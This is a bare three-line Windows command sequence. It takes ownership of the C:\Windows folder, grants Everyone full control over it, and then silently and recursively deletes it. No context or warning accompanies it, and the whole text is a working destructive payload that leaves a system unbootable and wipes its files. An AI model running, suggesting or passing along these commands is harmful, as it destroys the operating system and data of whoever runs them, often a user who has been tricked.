takeown /f C:\Windows /r /d y
icacls C:\Windows /grant Everyone:F /t /c /q
rmdir /s /q C:\Windows
